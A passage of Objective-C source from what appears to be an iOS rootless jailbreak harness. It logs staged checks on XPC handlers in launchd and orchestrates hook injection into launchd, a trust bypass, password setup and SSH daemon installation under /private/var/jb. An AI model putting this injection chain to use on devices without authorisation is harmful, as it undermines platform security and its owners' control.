            @"OUTPUT_SLOT_BIND", @"ARG_TERMINATOR_FOUND",
            @"MARSHALLING_COMPLETE",
        };
        for (NSUInteger i = 0; i < 11; i++) {
            dt699_stage([[NSString stringWithFormat:@"%@_%@_DELTA=%llu",
                argumentBuildPrefix, argumentNames[i],
                (unsigned long long)argument_deltas_102739h[i]] UTF8String]);
        }
#ifdef DT_BUILD102739I_VARIANT
        BOOL handler_pass_102739i = argument_pass_102739h
            && handler_delta_parsed_102739i;
        NSString *handlerNames[] = {
            @"HANDLER_CALL_ATTEMPT", @"HANDLER_RETURN",
            @"HANDLER_ARG0_OUTPUT_SLOT_MATCH", @"HANDLER_ARGS1_THROUGH_7_NULL",
            @"HANDLER_OUTPUT_WRITE", @"ARGSOUT0_SENTINEL_MATCH",
            @"ARGSOUT_TAIL_NULL", @"HANDLER_RESULT_MATCH",
            @"CONTROLLED_HANDLER_COMPLETE",
        };
        for (NSUInteger i = 0; i < 9; i++) {
            handler_pass_102739i = handler_pass_102739i
                && handler_deltas_102739i[i] == 1;
        }
        NSString *handlerBuildPrefix =
#ifdef DT_BUILD102739J_VARIANT
            @"BUILD102739J";
#else
            @"BUILD102739I";
#endif
        dt699_stage([[NSString stringWithFormat:
            @"%@_HANDLER_DELTA_PARSED=%s", handlerBuildPrefix,
            dt102735d_yesno(handler_delta_parsed_102739i)] UTF8String]);
        for (NSUInteger i = 0; i < 9; i++) {
            dt699_stage([[NSString stringWithFormat:@"%@_%@_DELTA=%llu",
                handlerBuildPrefix, handlerNames[i],
                (unsigned long long)handler_deltas_102739i[i]] UTF8String]);
        }
#ifdef DT_BUILD102739J_VARIANT
        dt699_stage([[NSString stringWithFormat:
            @"BUILD102739J_DIRECT_HELPER_VERDICT_PARSED=%s",
            dt102735d_yesno(direct_j_verdict_parsed_102739j)] UTF8String]);
        handler_pass_102739i = handler_pass_102739i
            && observer_r_102739c == 0 && trigger_send_rc_102739d == 0
            && direct_j_verdict_parsed_102739j;
#ifdef DT_ROOTLESS_R4
        dt699_stage([[NSString stringWithFormat:
            @"ROOTLESS_R9_LEGACY_J_HANDLER_PASS=%@",
            handler_pass_102739i ? @"YES" : @"NO"] UTF8String]);
        handler_pass_102739i = r9_ctor_product_ok;
        dt699_stage([[NSString stringWithFormat:
            @"ROOTLESS_R9_PRODUCT_GATE_TO_FRESH=%@",
            handler_pass_102739i ? @"YES" : @"NO"] UTF8String]);
#endif
        if (handler_pass_102739i) {
#ifdef DT_BUILD102739K_VARIANT
#ifdef DT_ROOTLESS_R4
            dt699_stage("BUILD102739J_FINAL_RESULT=SKIPPED_PRODUCT_NOT_TERMINAL");
            dt699_stage("BUILD102739J_RESULT=SKIPPED_PRODUCT_NOT_TERMINAL");
            dt699_stage("BUILD102739J_BASELINE_RESULT=NOT_PRODUCT_PREREQUISITE");
            dt699_stage("ROOTLESS_R9_FRESH_FS_UNGATED_FROM_J=YES");
#else
            dt699_stage("BUILD102739J_FINAL_RESULT=CONTROLLED_REPLY_ROUNDTRIP_PASS");
            dt699_stage("BUILD102739J_RESULT=CONTROLLED_REPLY_ROUNDTRIP_PASS");
            dt699_stage("BUILD102739J_BASELINE_RESULT=CONTROLLED_REPLY_ROUNDTRIP_PASS");
#endif
#ifdef DT_ROOTLESS_R4
            NSString *preflightVerdict102739k = nil;
            int preflightRC102739k = 0;
            {
                NSString *rjDetail = nil;
                DTRootlessVarJbState rjState = dt_rootless_classify_var_jb(&rjDetail);
                dt699_stage([[NSString stringWithFormat:@"ROOTLESS_VAR_JB_STATE=%@ detail=%@",
                    dt_rootless_state_name(rjState), rjDetail ?: @""] UTF8String]);
                if (rjState == DTRootlessVarJbForeign) {
                    preflightRC102739k = -2;
                    preflightVerdict102739k = [NSString stringWithFormat:@"FOREIGN:%@", rjDetail ?: @""];
                } else if (rjState == DTRootlessVarJbCommittedValid) {
                    preflightRC102739k = dt_rootless_run_reuse_fs_stage(log, &preflightVerdict102739k);
                } else {
                    preflightRC102739k = dt_rootless_run_fresh_fs_stage(log, &preflightVerdict102739k);
                }
                dt699_stage([[NSString stringWithFormat:@"ROOTLESS_FS_VERDICT=%@",
                    preflightVerdict102739k ?: @"nil"] UTF8String]);
            }
#else
            NSString *preflightVerdict102739k = nil;
            int preflightRC102739k = dt_build102739k_run_rootful_bootstrap_preflight(
                log, &preflightVerdict102739k);
#endif
            dt699_stage([[NSString stringWithFormat:
                @"BUILD102739K_PREFLIGHT_RC=%d", preflightRC102739k] UTF8String]);
            if (preflightRC102739k == 0) {
#ifdef DT_BUILD102739L_VARIANT
#ifdef DT_ROOTLESS_R4
                NSString *preflightVerdict102739l = @"ROOTLESS_L_RETIRED_ACTIVE";
                int preflightRC102739l = 0;
#else
                NSString *preflightVerdict102739l = nil;
                int preflightRC102739l = dt_build102739l_run_rootful_bootstrap_policy_preflight(
                    log, &preflightVerdict102739l);
#endif
                dt699_stage([[NSString stringWithFormat:
                    @"BUILD102739L_PREFLIGHT_RC=%d", preflightRC102739l] UTF8String]);
                if (preflightRC102739l == 0) {
#ifdef DT_BUILD102739M_VARIANT
#ifdef DT_ROOTLESS_R4
                    dt699_stage("BUILD102739L_BASELINE_RESULT=ROOTLESS_R4_FS_PASS");
#else
                    dt699_stage("BUILD102739L_BASELINE_RESULT=ROOTFUL_BOOTSTRAP_POLICY_READ_ONLY_PASS");
#endif
#ifdef DT_BUILD102739N_VARIANT
                    DTBuild102739NDispatch nDispatch102739n =
                        dt_build102739n_current_dispatch();
                    BOOL runMFirst102739n =
                        nDispatch102739n == DTBuild102739NDispatchRunA;
                    int executionRC102739m = 0;
                    NSString *executionVerdict102739m = nil;
#ifdef DT_ROOTLESS_R4
                    /*
                     * R8: BUILD102739M/N are persistent control-fixture proofs, not product
                     * rootless gates. Mutating RunA (fresh fixture + virgin N trust) conflicts
                     * with LEGACY_ROOTFUL project-owned preexisting fixtures and prior N trust
                     * residue. Equivalence: Wall2 + rootless FS/postverify/trust/opainject/
                     * prep/SSH/commit-last (see docs/r8_post_kfd_n/).
                     * Keep M/N compiled for non-rootless / explicit diagnostic builds.
                     */
                    dt699_stage("ROOTLESS_R8_POST_KFD_N_BEGIN");
                    dt699_stage("ROOTLESS_PRODUCT_EXECUTES_N_RUNA_MUTATION=NO");
                    dt699_stage("ROOTLESS_R8_M_FIXTURE_PROOF=SKIPPED_PRODUCT");
                    dt699_stage("ROOTLESS_R8_N_FIXTURE_PROOF=SKIPPED_PRODUCT");
                    dt699_stage([[NSString stringWithFormat:
                        @"ROOTLESS_R8_N_DISPATCH_WAS=%ld", (long)nDispatch102739n] UTF8String]);
                    dt699_stage("UNKNOWN_N_TREE_ACCEPTED_AS_PROJECT=NO");
                    dt699_stage("FOREIGN_FAIL_CLOSED=YES");
                    dt699_stage("POST_FS_STALE_TEST_GATE_COUNT=0");
                    if (!runMFirst102739n)
                        dt699_stage("BUILD102739N_M_FULL_EXTERNAL_HELPER_PROOF=NOT_INVOKED_ON_RUN_B");
                    executionRC102739m = 0;
                    executionVerdict102739m = @"ROOTLESS_R8_M_SKIPPED_PRODUCT";
                    dt699_stage("BUILD102739M_EXECUTION_RC=0");
#else
                    if (runMFirst102739n) {
                        executionRC102739m =
                            dt_build102739m_run_external_helper_execution_proof(
                                log, restore_r_102737 == 0, &executionVerdict102739m);
                        dt699_stage([[NSString stringWithFormat:
                            @"BUILD102739M_EXECUTION_RC=%d", executionRC102739m] UTF8String]);
                    } else {
                        dt699_stage("BUILD102739N_M_FULL_EXTERNAL_HELPER_PROOF=NOT_INVOKED_ON_RUN_B");
                    }
#endif
                    if (executionRC102739m == 0) {
                        NSString *executionVerdict102739n = nil;
                        int executionRC102739n = 0;
#ifdef DT_ROOTLESS_R4
                        executionVerdict102739n = @"ROOTLESS_R8_N_SKIPPED_PRODUCT_EQUIVALENCE";
                        executionRC102739n = 0;
                        dt699_stage("BUILD102739N_EXECUTION_RC=0");
                        dt699_stage("BUILD102739N_RESULT=ROOTLESS_R8_N_SKIPPED_PRODUCT_EQUIVALENCE");
#else
                        executionRC102739n =
                            dt_build102739n_run_persistent_control_fixture_proof(
                                log, restore_r_102737 == 0, runMFirst102739n,
                                &executionVerdict102739n);
                        dt699_stage([[NSString stringWithFormat:
                            @"BUILD102739N_EXECUTION_RC=%d", executionRC102739n] UTF8String]);
#endif
                        if (executionRC102739n == 0) {
#ifdef DT_ROOTLESS_R4
                            trace_result = runMFirst102739n
                                ? "ROOTLESS_R8_POST_FS_PRODUCT_GATES"
                                : "ROOTLESS_R8_POST_FS_PRODUCT_GATES_REUSE";
                            trace_rc = 0;
#else
                            trace_result = runMFirst102739n
                                ? "PERSISTENT_CONTROL_FIXTURE_STAGE_PASS_AWAITING_REBOOT"
                                : "PERSISTENT_CONTROL_FIXTURE_REACTIVATION_AND_CLEANUP_PASS_WITH_RESIDUAL_IN_MEMORY_TRUST";
                            trace_rc = 0;
#endif
#ifdef DT_ROOTLESS_R4
                            {
                                /* R3 commit-last: reinject AFTER rootless trust, require ctor,
                                 * then KEEP prep_bootstrap password/account UI, then SSH bins, then commit. */
                                NSString *postInjectCapture = nil;
                                int postInjectRC = dt681_spawn_opainject_launchd(
                                    dt710_resolve_hook_path().fileSystemRepresentation,
                                    log, &postInjectCapture);
                                dt699_stage([[NSString stringWithFormat:
                                    @"ROOTLESS_POST_TRUST_OPAINJECT_RC=%d", postInjectRC] UTF8String]);
                                BOOL ctorOK = (access("/private/var/jb/.dt518_launchdhook_ctor_entered", F_OK) == 0)
                                    || (access("/private/var/jb/.dt516_launchdhook_loaded", F_OK) == 0);
                                dt699_stage([[NSString stringWithFormat:
                                    @"ROOTLESS_HOOK_CTOR_MARKER=%@", ctorOK ? @"YES" : @"NO"] UTF8String]);
                                NSString *prepErr = nil;
                                int prepRC = 0;
                                if (postInjectRC == 0 && ctorOK) {
                                    prepRC = dt_rootless_run_prep_bootstrap(log, &prepErr);
                                    dt699_stage([[NSString stringWithFormat:
                                        @"ROOTLESS_PREP_BOOTSTRAP_RC=%d", prepRC] UTF8String]);
                                    if (prepErr.length) {
                                        dt699_stage([[NSString stringWithFormat:
                                            @"ROOTLESS_PREP_BOOTSTRAP_ERR=%@", prepErr] UTF8String]);
                                    }
                                }
                                NSString *sshBin = @"/private/var/jb/usr/bin/ssh";
                                NSString *sshdBin = @"/private/var/jb/usr/sbin/sshd";
                                NSString *sshdPlist = @"/private/var/jb/Library/LaunchDaemons/com.openssh.sshd.plist";
                                NSString *sshdCfg = @"/private/var/jb/etc/ssh/sshd_config";
                                BOOL sshOK = (access(sshBin.fileSystemRepresentation, X_OK) == 0)
                                    && (access(sshdBin.fileSystemRepresentation, X_OK) == 0)
                                    && (access(sshdPlist.fileSystemRepresentation, F_OK) == 0)
                                    && (access(sshdCfg.fileSystemRepresentation, F_OK) == 0);
                                dt699_stage([[NSString stringWithFormat:
                                    @"ROOTLESS_SSH_BINS_PRESENT=%@", sshOK ? @"YES" : @"NO"] UTF8String]);
                                dt699_stage([[NSString stringWithFormat:
                                    @"ROOTLESS_SSH_PLIST_PRESENT=%@",
                                    (access(sshdPlist.fileSystemRepresentation, F_OK) == 0) ? @"YES" : @"NO"] UTF8String]);
                                if (postInjectRC != 0) {
                                    trace_result = "ROOTLESS_POST_TRUST_OPAINJECT_FAIL";
                                    trace_rc = postInjectRC;
                                } else if (!ctorOK) {
                                    trace_result = "ROOTLESS_HOOK_CTOR_MARKER_MISSING";
                                    trace_rc = -4;
                                } else if (prepRC != 0) {
                                    /* Password/account finalize failed — do NOT commit. */
                                    trace_result = "ROOTLESS_PASSWORD_SETUP_FAIL";
                                    trace_rc = prepRC;
                                } else if (!sshOK) {
                                    trace_result = "ROOTLESS_SSH_CHAIN_STATIC_MISSING";
                                    trace_rc = -3;
                                } else {
                                    NSString *commitVerdict = nil;
                                    int commitRC = dt_rootless_run_commit_last(log, @{
                                        @"n_trace_result": @(trace_result),
                                        @"post_trust_opainject_rc": @(postInjectRC),
                                        @"ctor_marker": @"YES",
                                        @"password_setup": @"OK",
                                        @"ssh_chain": @"bins+plist+config",
                                    }, &commitVerdict);
                                    dt699_stage([[NSString stringWithFormat:
                                        @"ROOTLESS_COMMIT_RC=%d", commitRC] UTF8String]);
                                    dt699_stage([[NSString stringWithFormat:
                                        @"ROOTLESS_COMMIT_VERDICT=%@", commitVerdict ?: @"nil"] UTF8String]);
                                    if (commitRC != 0) {
                                        trace_result = "ROOTLESS_COMMIT_FAIL";
                                        trace_rc = commitRC;
                                    } else {
                                        trace_result = runMFirst102739n
                                            ? "ROOTLESS_FRESH_COMMITTED_PASS"
                                            : "ROOTLESS_REUSE_COMMITTED_PASS";
                                    }
                                }
                            }
#endif
                        } else {
                            trace_result = "PERSISTENT_CONTROL_FIXTURE_PROOF_FAIL";
                            trace_rc = executionRC102739n;
                            dt699_stage([[NSString stringWithFormat:@"BUILD102739N_RESULT=%@",
                                executionVerdict102739n ?: @"PERSISTENT_CONTROL_FIXTURE_PROOF_FAIL"] UTF8String]);
                        }
                    } else {
                        trace_result = "EXTERNAL_HELPER_EXECUTION_FAIL";
                        trace_rc = executionRC102739m;
                        dt699_stage([[NSString stringWithFormat:@"BUILD102739M_RESULT=%@",
                            executionVerdict102739m ?: @"EXTERNAL_HELPER_EXECUTION_FAIL"] UTF8String]);
                    }
#else
                    NSString *executionVerdict102739m = nil;
                    int executionRC102739m = dt_build102739m_run_external_helper_execution_proof(
                        log, restore_r_102737 == 0, &executionVerdict102739m);
                    dt699_stage([[NSString stringWithFormat:
                        @"BUILD102739M_EXECUTION_RC=%d", executionRC102739m] UTF8String]);
                    if (executionRC102739m == 0) {
                        trace_result = "EXTERNAL_HELPER_EXECUTION_PASS_WITH_RESIDUAL_IN_MEMORY_HELPER_TRUST";
                        trace_rc = 0;
                        dt699_stage("BUILD102739M_RESULT=EXTERNAL_HELPER_EXECUTION_PASS_WITH_RESIDUAL_IN_MEMORY_HELPER_TRUST");
                    } else {
                        trace_result = "EXTERNAL_HELPER_EXECUTION_FAIL";
                        trace_rc = executionRC102739m;
                        dt699_stage([[NSString stringWithFormat:@"BUILD102739M_RESULT=%@",
                            executionVerdict102739m ?: @"EXTERNAL_HELPER_EXECUTION_FAIL"] UTF8String]);
                    }
#endif
#else
                    trace_result = "ROOTFUL_BOOTSTRAP_POLICY_READ_ONLY_PASS";
                    trace_rc = 0;
                    dt699_stage("BUILD102739L_RESULT=ROOTFUL_BOOTSTRAP_POLICY_READ_ONLY_PASS");
#endif
                } else {
                    trace_result = "ROOTFUL_BOOTSTRAP_POLICY_READ_ONLY_FAIL";
                    trace_rc = preflightRC102739l;
                    dt699_stage("BUILD102739L_RESULT=ROOTFUL_BOOTSTRAP_POLICY_READ_ONLY_FAIL");
                }
#else
                trace_result = "ROOTFUL_BOOTSTRAP_PREFLIGHT_READ_ONLY_PASS";
                trace_rc = 0;
                dt699_stage("BUILD102739K_RESULT=ROOTFUL_BOOTSTRAP_PREFLIGHT_READ_ONLY_PASS");
#endif
            } else {
                trace_result = "ROOTFUL_BOOTSTRAP_PREFLIGHT_READ_ONLY_FAIL";
                trace_rc = preflightRC102739k;
                dt699_stage("BUILD102739K_RESULT=ROOTFUL_BOOTSTRAP_PREFLIGHT_READ_ONLY_FAIL");
            }
#else
            trace_result = "CONTROLLED_REPLY_ROUNDTRIP_PASS";
            trace_rc = 0;
            dt699_stage("BUILD102739J_FINAL_RESULT=CONTROLLED_REPLY_ROUNDTRIP_PASS");
            dt699_stage("BUILD102739J_RESULT=CONTROLLED_REPLY_ROUNDTRIP_PASS");
#endif
        } else {
#ifdef DT_BUILD102739K_VARIANT
#ifdef DT_ROOTLESS_R4
            dt699_stage("BUILD102739J_FINAL_RESULT=SKIPPED_PRODUCT_NOT_TERMINAL");
            dt699_stage("BUILD102739J_RESULT=SKIPPED_PRODUCT_NOT_TERMINAL");
            trace_result = "ROOTLESS_CTOR_OR_WALL2_PRODUCT_FAIL";
            trace_rc = -73991;
            dt699_stage("BUILD102739K_PREFLIGHT_SKIPPED_CTOR_PRODUCT_FAIL=YES");
            dt699_stage("BUILD102739K_RESULT=ROOTLESS_CTOR_OR_WALL2_PRODUCT_FAIL");
#else
            dt699_stage("BUILD102739J_FINAL_RESULT=CONTROLLED_REPLY_ROUNDTRIP_FAIL");
            dt699_stage("BUILD102739J_RESULT=CONTROLLED_REPLY_ROUNDTRIP_FAIL");
            trace_result = "ROOTFUL_BOOTSTRAP_PREFLIGHT_J_BASELINE_FAIL";
            trace_rc = -73991;
            dt699_stage("BUILD102739K_PREFLIGHT_SKIPPED_J_BASELINE_FAIL=YES");
            dt699_stage("BUILD102739K_RESULT=ROOTFUL_BOOTSTRAP_PREFLIGHT_J_BASELINE_FAIL");
#endif
#else
            trace_result = "CONTROLLED_REPLY_ROUNDTRIP_FAIL";
            trace_rc = -73991;
            dt699_stage("BUILD102739J_FINAL_RESULT=CONTROLLED_REPLY_ROUNDTRIP_FAIL");
            dt699_stage("BUILD102739J_RESULT=CONTROLLED_REPLY_ROUNDTRIP_FAIL");
#endif
        }
#else
        if (handler_pass_102739i) {
            trace_result = "CONTROLLED_ACTION_HANDLER_ABI_PASS";
            trace_rc = 0;
            dt699_stage("BUILD102739I_FINAL_RESULT=CONTROLLED_ACTION_HANDLER_ABI_PASS");
            dt699_stage("BUILD102739I_RESULT=CONTROLLED_ACTION_HANDLER_ABI_PASS");
        } else {
            trace_result = "CONTROLLED_ACTION_HANDLER_ABI_FAIL";
            trace_rc = -73990;
            dt699_stage("BUILD102739I_FINAL_RESULT=CONTROLLED_ACTION_HANDLER_ABI_FAIL");
            dt699_stage("BUILD102739I_RESULT=CONTROLLED_ACTION_HANDLER_ABI_FAIL");
        }
#endif
#else
        if (argument_pass_102739h) {
            trace_result = "READ_ONLY_ACTION_ARGUMENT_MARSHALLING_PASS";
            trace_rc = 0;
            dt699_stage("BUILD102739H_FINAL_RESULT=READ_ONLY_ACTION_ARGUMENT_MARSHALLING_PASS");
            dt699_stage("BUILD102739H_RESULT=READ_ONLY_ACTION_ARGUMENT_MARSHALLING_PASS");
        } else {
            trace_result = "READ_ONLY_ACTION_ARGUMENT_MARSHALLING_FAIL";
            trace_rc = -73980;
            dt699_stage("BUILD102739H_FINAL_RESULT=READ_ONLY_ACTION_ARGUMENT_MARSHALLING_FAIL");
            dt699_stage("BUILD102739H_RESULT=READ_ONLY_ACTION_ARGUMENT_MARSHALLING_FAIL");
        }
#endif
#else
        if (resolution_pass_102739g) {
            trace_result = "READ_ONLY_DOMAIN_PERMISSION_ACTION_RESOLUTION_PASS";
            trace_rc = 0;
            dt699_stage("BUILD102739G_FINAL_RESULT=READ_ONLY_DOMAIN_PERMISSION_ACTION_RESOLUTION_PASS");
            dt699_stage("BUILD102739G_RESULT=READ_ONLY_DOMAIN_PERMISSION_ACTION_RESOLUTION_PASS");
        } else {
            trace_result = "READ_ONLY_DOMAIN_PERMISSION_ACTION_RESOLUTION_FAIL";
            trace_rc = -73970;
            dt699_stage("BUILD102739G_FINAL_RESULT=READ_ONLY_DOMAIN_PERMISSION_ACTION_RESOLUTION_FAIL");
            dt699_stage("BUILD102739G_RESULT=READ_ONLY_DOMAIN_PERMISSION_ACTION_RESOLUTION_FAIL");
        }
#endif
#else
        if (identity_pass_102739f) {
            trace_result = "READ_ONLY_CALLER_IDENTITY_PASS";
            trace_rc = 0;
            dt699_stage("BUILD102739F_FINAL_RESULT=READ_ONLY_CALLER_IDENTITY_PASS");
            dt699_stage("BUILD102739F_RESULT=READ_ONLY_CALLER_IDENTITY_PASS");
        } else {
            trace_result = "READ_ONLY_CALLER_IDENTITY_FAIL";
            trace_rc = -73960;
            dt699_stage("BUILD102739F_FINAL_RESULT=READ_ONLY_CALLER_IDENTITY_FAIL");
            dt699_stage("BUILD102739F_RESULT=READ_ONLY_CALLER_IDENTITY_FAIL");
        }
#endif
#else
        BOOL classifier_pass_102739e = trigger_return_pass_102739d
            && classifier_delta_parsed_102739e
            && dictionary_delta_102739e >= 1
            && envelope_delta_102739e >= 1
            && exact_probe_delta_102739e == 1;
        dt699_stage([[NSString stringWithFormat:@"BUILD102739E_TRIGGER_DELTA_PARSED=%s",
            dt102735d_yesno(trigger_delta_parsed_102739d)] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739E_CLASSIFIER_DELTA_PARSED=%s",
            dt102735d_yesno(classifier_delta_parsed_102739e)] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739E_TRIGGER_SEND_RC=%d",
            trigger_send_rc_102739d] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739E_ENTRY_DELTA=%llu",
            (unsigned long long)trigger_entry_delta_102739d] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739E_RETURN_DELTA=%llu",
            (unsigned long long)trigger_return_delta_102739d] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739E_SUCCESS_OBJECT_DELTA=%llu",
            (unsigned long long)trigger_success_object_delta_102739d] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739E_DICTIONARY_OBJECT_DELTA=%llu",
            (unsigned long long)dictionary_delta_102739e] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739E_DOMAIN_ACTION_ENVELOPE_DELTA=%llu",
            (unsigned long long)envelope_delta_102739e] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739E_EXACT_CONTROLLED_PROBE_DELTA=%llu",
            (unsigned long long)exact_probe_delta_102739e] UTF8String]);
        if (classifier_pass_102739e) {
            trace_result = "READ_ONLY_XPC_DICTIONARY_CLASSIFICATION_PASS";
            trace_rc = 0;
            dt699_stage("BUILD102739E_RESULT=READ_ONLY_XPC_DICTIONARY_CLASSIFICATION_PASS");
        } else {
            trace_result = "READ_ONLY_XPC_DICTIONARY_CLASSIFICATION_FAIL";
            trace_rc = -73950;
            dt699_stage("BUILD102739E_RESULT=READ_ONLY_XPC_DICTIONARY_CLASSIFICATION_FAIL");
        }
#endif
#else
        if (trigger_return_pass_102739d) {
            if (trigger_success_object_delta_102739d > 0) {
                trace_result = "DETERMINISTIC_XPC_OUTPUT_CONTRACT_PASS";
                dt699_stage("BUILD102739D_RESULT=DETERMINISTIC_XPC_OUTPUT_CONTRACT_PASS");
            } else {
                trace_result = "DETERMINISTIC_TRIGGER_RETURN_PATH_PASS";
                dt699_stage("BUILD102739D_RESULT=DETERMINISTIC_TRIGGER_RETURN_PATH_PASS");
            }
            trace_rc = 0;
        } else if (trigger_delta_parsed_102739d && trigger_entry_delta_102739d == 0) {
            trace_result = "DETERMINISTIC_TRIGGER_NO_INVOCATION";
            trace_rc = -73940;
            dt699_stage("BUILD102739D_RESULT=DETERMINISTIC_TRIGGER_NO_INVOCATION");
        } else {
            trace_result = "DETERMINISTIC_TRIGGER_OBSERVER_FAIL";
            trace_rc = -73941;
            dt699_stage("BUILD102739D_RESULT=DETERMINISTIC_TRIGGER_OBSERVER_FAIL");
        }
#endif
#endif
#elif defined(DT_BUILD102739B_VARIANT)
        int observer_r_102739b = -1;
        uint64_t observer_entry_102739b = 0;
        uint64_t observer_return_102739b = 0;
        BOOL observer_telemetry_parsed_102739b = NO;
        NSTimeInterval observer_begin_102739b = [[NSDate date] timeIntervalSince1970];
        dt699_stage([[NSString stringWithFormat:
            @"BUILD102739B_OBSERVER_BEGIN_TIMESTAMP=%.3f", observer_begin_102739b]
            UTF8String]);
        if (restore_r_102737 == 0 && trace_rc == 0) {
            NSString *observerCapture = nil;
            observer_r_102739b = dt681_observe_launchd_return_telemetry(
                dt710_resolve_hook_path().fileSystemRepresentation, log, &observerCapture);
            observer_telemetry_parsed_102739b = dt102739b_extract_return_telemetry(
                observerCapture, &observer_entry_102739b, &observer_return_102739b);
        } else {
            dt699_stage("BUILD102739B_OBSERVER_SKIPPED_PREREQUISITE_FAIL");
        }
        NSTimeInterval observer_end_102739b = [[NSDate date] timeIntervalSince1970];
        BOOL observer_after_restore_102739b =
            observer_begin_102739b >= wall2_restore_end_ts;
        dt699_stage([[NSString stringWithFormat:
            @"BUILD102739B_OBSERVER_END_TIMESTAMP=%.3f", observer_end_102739b]
            UTF8String]);
        dt699_stage([[NSString stringWithFormat:
            @"BUILD102739B_OBSERVER_AFTER_WALL2_RESTORE=%s",
            dt102735d_yesno(observer_after_restore_102739b)] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739B_OBSERVER_RC=%d",
            observer_r_102739b] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739B_TELEMETRY_PARSED=%s",
            dt102735d_yesno(observer_telemetry_parsed_102739b)] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739B_ENTRY_COUNT=%llu",
            (unsigned long long)observer_entry_102739b] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739B_RETURN_COUNT=%llu",
            (unsigned long long)observer_return_102739b] UTF8String]);
        BOOL return_path_pass_102739b = restore_r_102737 == 0 && trace_rc == 0
            && observer_after_restore_102739b && observer_r_102739b == 0
            && observer_telemetry_parsed_102739b && observer_return_102739b > 0
            && observer_entry_102739b >= observer_return_102739b;
        if (return_path_pass_102739b) {
            trace_result = "POST_ORIGINAL_RETURN_PATH_PASS";
            trace_rc = 0;
            dt699_stage("BUILD102739B_POST_ORIGINAL_RETURN_PATH=PASS");
        } else if (observer_r_102739b == 17 && observer_telemetry_parsed_102739b) {
            trace_result = "POST_ORIGINAL_RETURN_PATH_INCONCLUSIVE";
            trace_rc = -73927;
            dt699_stage("BUILD102739B_POST_ORIGINAL_RETURN_PATH=INCONCLUSIVE");
        } else if (restore_r_102737 == 0 && trace_rc == 0) {
            trace_result = "POST_ORIGINAL_RETURN_OBSERVER_FAIL";
            trace_rc = -73928;
            dt699_stage("BUILD102739B_POST_ORIGINAL_RETURN_PATH=FAIL");
        }
#elif defined(DT_BUILD102739A_VARIANT)
        int observer_r_102739a = -1;
        uint64_t observer_count_102739a = 0;
        BOOL observer_count_parsed_102739a = NO;
        NSTimeInterval observer_begin_102739a = [[NSDate date] timeIntervalSince1970];
        dt699_stage([[NSString stringWithFormat:
            @"BUILD102739A_OBSERVER_BEGIN_TIMESTAMP=%.3f", observer_begin_102739a]
            UTF8String]);
        if (restore_r_102737 == 0 && trace_rc == 0) {
            NSString *observerCapture = nil;
            observer_r_102739a = dt681_observe_launchd_counter(
                dt710_resolve_hook_path().fileSystemRepresentation, log, &observerCapture);
            observer_count_parsed_102739a =
                dt102739a_extract_counter(observerCapture, &observer_count_102739a);
        } else {
            dt699_stage("BUILD102739A_OBSERVER_SKIPPED_PREREQUISITE_FAIL");
        }
        NSTimeInterval observer_end_102739a = [[NSDate date] timeIntervalSince1970];
        dt699_stage([[NSString stringWithFormat:
            @"BUILD102739A_OBSERVER_END_TIMESTAMP=%.3f", observer_end_102739a]
            UTF8String]);
        dt699_stage([[NSString stringWithFormat:
            @"BUILD102739A_OBSERVER_AFTER_WALL2_RESTORE=%s",
            dt102735d_yesno(observer_begin_102739a >= wall2_restore_end_ts)] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739A_OBSERVER_RC=%d",
            observer_r_102739a] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739A_COUNTER_PARSED=%s",
            dt102735d_yesno(observer_count_parsed_102739a)] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102739A_INVOCATION_COUNT=%llu",
            (unsigned long long)observer_count_102739a] UTF8String]);
        if (restore_r_102737 == 0 && trace_rc == 0 && observer_r_102739a == 0
            && observer_count_parsed_102739a && observer_count_102739a > 0) {
            trace_result = "POST_WALL2_INVOCATION_OBSERVED_PASS";
            trace_rc = 0;
            dt699_stage("BUILD102739A_POST_WALL2_INVOCATION_OBSERVED=YES");
        } else if (observer_r_102739a == 17 && observer_count_parsed_102739a) {
            trace_result = "POST_WALL2_INVOCATION_INCONCLUSIVE";
            trace_rc = -73917;
            dt699_stage("BUILD102739A_POST_WALL2_INVOCATION_OBSERVED=NO");
        } else if (restore_r_102737 == 0 && trace_rc == 0) {
            trace_result = "POST_WALL2_OBSERVER_FAIL";
            trace_rc = -73918;
            dt699_stage("BUILD102739A_POST_WALL2_INVOCATION_OBSERVED=UNKNOWN");
        }
#endif

#if DT_BUILD_NUM == 102738
        NSTimeInterval survival_start_102738 = [[NSDate date] timeIntervalSince1970];
        sleep(kDT694SyncObserveSec);
        NSTimeInterval survival_end_102738 = [[NSDate date] timeIntervalSince1970];
        BOOL pid1_alive_102738 = dt698_launchd_alive();
        uint64_t pid1_after_102738 = dt102732c_pid1_proc_snapshot();
        BOOL pid1_same_102738 = pid1_before != 0 && pid1_before == pid1_after_102738;
        dt699_stage([[NSString stringWithFormat:@"BUILD102738P_SURVIVAL_START_TS=%.3f",
            survival_start_102738] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102738P_SURVIVAL_END_TS=%.3f",
            survival_end_102738] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102738P_SURVIVAL_WINDOW_SECONDS=%u",
            (unsigned)kDT694SyncObserveSec] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102738P_PID1_PRESENT_AFTER_RETURN=%@",
            pid1_alive_102738 ? @"YES" : @"NO"] UTF8String]);
        dt699_stage([[NSString stringWithFormat:@"BUILD102738P_PID1_IDENTITY_UNCHANGED=%@",
            pid1_same_102738 ? @"YES" : @"NO"] UTF8String]);
#ifdef DT_BUILD102739C_VARIANT
#ifdef DT_BUILD102739D_VARIANT
        dt699_stage([[NSString stringWithFormat:@"BUILD102739D_PID1_PRESENT_AFTER_OBSERVER=%@",
